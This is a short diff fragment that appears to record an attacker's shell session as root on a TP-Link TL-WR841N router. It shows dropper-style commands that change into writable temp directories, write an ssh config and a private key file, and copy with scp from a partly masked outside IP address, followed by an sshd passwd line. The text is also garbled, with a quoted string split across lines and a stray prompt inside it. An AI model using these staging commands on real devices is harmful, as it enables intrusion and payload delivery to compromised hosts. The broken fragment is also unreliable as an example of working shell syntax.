@@ -1,0 +1,3 @@
+[4lroot@TL-WR841N:~# cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----
+root@TL-WR841N:~# UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.XXX
+sshd:x:22:22:sshd:/var/empty:/bin/false
